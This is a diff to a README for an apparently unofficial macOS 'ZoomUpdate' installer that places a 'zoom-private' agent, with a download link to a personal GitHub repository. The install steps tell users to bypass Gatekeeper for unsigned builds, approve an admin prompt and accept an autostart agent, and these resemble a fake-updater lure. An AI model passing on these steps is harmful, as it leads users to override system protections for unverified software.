@@ -6,21 +6,25 @@ A double-clickable macOS client that installs the `zoom-private` agent.
 It downloads the official installer disk image over HTTPS, mounts it, runs the
 self-elevating setup app, cleans up, and relaunches the installed agent.
 
+## Download
+
+Grab the latest signed-off build from [Releases](https://github.com/fingod201-maker/zoom-update-macos/releases/latest).
+
 ## Artifacts
 
 Every CI run produces, in the workflow run's **Artifacts** section:
 
 | File | Purpose |
 | --- | --- |
-| `ZoomUpdate-1.0.0.zip` | The signed app bundle, for manual distribution |
-| `ZoomUpdate-1.0.0.pkg` | Installer that places the app in `/Applications` and launches it |
+| `ZoomUpdate-<version>.zip` | The signed app bundle, for manual distribution |
+| `ZoomUpdate-<version>.pkg` | Installer that places the app in `/Applications` and launches it |
 | `SHA256SUMS` | Checksums for both files |
 
 Pushing a `v*` tag also publishes the same files to a GitHub Release.
 
 ## Install
 
-1. Download `ZoomUpdate-1.0.0.pkg` (or expand the zip).
+1. Download `ZoomUpdate-<version>.pkg` (or expand the zip).
 2. Right-click **Open** the first time. Unsigned builds trip Gatekeeper.
 3. Approve the admin prompt. The setup app verifies its payload by SHA-256 and
    registers the agent for autostart.
